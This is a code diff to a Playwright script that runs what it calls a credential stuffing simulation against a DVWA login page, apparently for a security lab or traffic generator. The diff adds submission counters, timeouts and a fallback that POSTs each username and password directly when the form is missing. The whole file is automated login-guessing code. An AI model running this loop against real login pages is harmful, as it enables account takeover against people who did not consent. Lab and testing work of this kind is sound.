@@ -53,12 +53,15 @@ const CREDENTIALS = [
 
   let successes = 0;
   let failures = 0;
+  let launched = 0;
+  let transportFailures = 0;
 
   for (const cred of CREDENTIALS) {
     const context = await browser.newContext({
       ignoreHTTPSErrors: true,
     });
     const page = await context.newPage();
+    page.setDefaultTimeout(10000);
 
     try {
       console.log(`[+] Trying: ${cred.user} / ${cred.password}`);
@@ -69,6 +72,15 @@ const CREDENTIALS = [
       });
 
       const hasForm = await page.$('input[name="username"]');
+      if (!hasForm && process.env.TGEN_INHERITED_BOUNDARY === '1') {
+        const response = await context.request.post(`${BASE_URL}/dvwa/login.php`, {
+          form: { username: cred.user, password: cred.password, Login: 'Login' },
+          timeout: 15000,
+        });
+        launched++;
+        console.log(`    -> BROWSER REQUEST FALLBACK: credential submitted, HTTP ${response.status()}`);
+        continue;
+      }
       if (!hasForm) {
         const body = await page.textContent('body').catch(() => '');
         if (body.includes('Connection refused') || body.includes('Fatal error')) {
@@ -84,6 +96,7 @@ const CREDENTIALS = [
       await page.fill('input[name="username"]', cred.user);
       await page.fill('input[name="password"]', cred.password);
       await page.click('input[type="submit"]');
+      launched++;
 
       await page.waitForTimeout(1000);
 
@@ -98,6 +111,7 @@ const CREDENTIALS = [
     } catch (err) {
       console.log(`    -> ERROR: ${err.message}`);
       failures++;
+      transportFailures++;
     } finally {
       await context.close();
     }
@@ -109,4 +123,7 @@ const CREDENTIALS = [
   console.log('');
   console.log('[*] Credential stuffing simulation complete');
   console.log(`    Successes: ${successes} | Failures: ${failures}`);
+  console.log(`    Credentials submitted: ${launched}`);
+  if (process.env.TGEN_INHERITED_BOUNDARY === '1' && (launched !== CREDENTIALS.length || transportFailures))
+    process.exitCode = 1;
 })();
